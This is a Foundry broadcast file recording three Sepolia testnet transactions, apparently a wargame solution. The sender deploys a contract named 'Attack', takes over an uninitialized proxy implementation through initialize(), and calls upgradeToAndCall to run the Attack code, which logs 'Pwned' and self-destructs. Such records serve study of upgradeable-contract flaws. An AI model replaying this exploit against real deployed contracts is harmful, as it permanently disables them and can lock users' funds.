{
  "transactions": [
    {
      "hash": "0x2d437738785b04c800ae035592dd7114804048a36db11419e09268e8d07a1aa1",
      "transactionType": "CREATE",
      "contractName": "Attack",
      "contractAddress": "0xcf8a9239d1697d2399fb7a81e58fe83b59bbe111",
      "function": null,
      "arguments": null,
      "transaction": {
        "from": "0x02a7abaaabe2053b49e7ca0a1a6eb33cea79299f",
        "gas": "0x2cb1b",
        "value": "0x0",
        "input": "0x608060405234801561001057600080fd5b50610195806100206000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063dd365b8b14610030575b600080fd5b61003861003a565b005b6100626040518060400160405280600681526020016550776e65642360d01b81525030610066565b6000ff5b61011d82826040516024018080602001836001600160a01b03168152602001828103825284818151815260200191508051906020019080838360005b838110156100ba5781810151838201526020016100a2565b50505050905090810190601f1680156100e75780820380516001836020036101000a031916815260200191505b5060408051601f198184030181529190526020810180516001600160e01b031663319af33360e01b179052935061012192505050565b5050565b6101388161013061013b61015c565b63ffffffff16565b50565b80516a636f6e736f6c652e6c6f67602083016000808483855afa5050505050565b9056fea264697066735822122013802f4fee29a9203efff0d695ca609945fa4bb9a536cd7e645105f8b583fd4964736f6c634300060c0033",
        "nonce": "0xd1",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0x7572474299d80d39fd717f5acff0a40d15877fef3625116b12f7a0f73639c048",
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x46fd6892bf55300daa074d54f1182a5b3070494a",
      "function": "initialize()",
      "arguments": [],
      "transaction": {
        "from": "0x02a7abaaabe2053b49e7ca0a1a6eb33cea79299f",
        "to": "0x46fd6892bf55300daa074d54f1182a5b3070494a",
        "gas": "0x1670f",
        "value": "0x0",
        "input": "0x8129fc1c",
        "nonce": "0xd2",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0x41c401a0ba73987822646b79eb9a82915de326eea13b0b98050b4a1daa9f8324",
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x46fd6892bf55300daa074d54f1182a5b3070494a",
      "function": "upgradeToAndCall(address,bytes)",
      "arguments": [
        "0xCF8a9239D1697d2399fB7A81e58FE83B59bBe111",
        "0xdd365b8b"
      ],
      "transaction": {
        "from": "0x02a7abaaabe2053b49e7ca0a1a6eb33cea79299f",
        "to": "0x46fd6892bf55300daa074d54f1182a5b3070494a",
        "gas": "0x148e2",
        "value": "0x0",
        "input": "0x4f1ef286000000000000000000000000cf8a9239d1697d2399fb7a81e58fe83b59bbe11100000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000004dd365b8b00000000000000000000000000000000000000000000000000000000",
        "nonce": "0xd3",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    }
  ],
  "receipts": [
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x9770db",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0x2d437738785b04c800ae035592dd7114804048a36db11419e09268e8d07a1aa1",
      "transactionIndex": "0x1d",
      "blockHash": "0x38ad13d50f631248e899526af29f225e59bd0b3a4bf998b825f54c2504532d68",
      "blockNumber": "0x66e44e",
      "gasUsed": "0x22631",
      "effectiveGasPrice": "0x68779011e",
      "from": "0x02a7abaaabe2053b49e7ca0a1a6eb33cea79299f",
      "to": null,
      "contractAddress": "0xcf8a9239d1697d2399fb7a81e58fe83b59bbe111"
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x9874cf",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0x7572474299d80d39fd717f5acff0a40d15877fef3625116b12f7a0f73639c048",
      "transactionIndex": "0x1e",
      "blockHash": "0x38ad13d50f631248e899526af29f225e59bd0b3a4bf998b825f54c2504532d68",
      "blockNumber": "0x66e44e",
      "gasUsed": "0x103f4",
      "effectiveGasPrice": "0x68779011e",
      "from": "0x02a7abaaabe2053b49e7ca0a1a6eb33cea79299f",
      "to": "0x46fd6892bf55300daa074d54f1182a5b3070494a",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x9962eb",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0x41c401a0ba73987822646b79eb9a82915de326eea13b0b98050b4a1daa9f8324",
      "transactionIndex": "0x1f",
      "blockHash": "0x38ad13d50f631248e899526af29f225e59bd0b3a4bf998b825f54c2504532d68",
      "blockNumber": "0x66e44e",
      "gasUsed": "0xee1c",
      "effectiveGasPrice": "0x68779011e",
      "from": "0x02a7abaaabe2053b49e7ca0a1a6eb33cea79299f",
      "to": "0x46fd6892bf55300daa074d54f1182a5b3070494a",
      "contractAddress": null
    }
  ],
  "libraries": [],
  "pending": [],
  "returns": {},
  "timestamp": 1727066094,
  "chain": 11155111,
  "commit": "b020e18"
}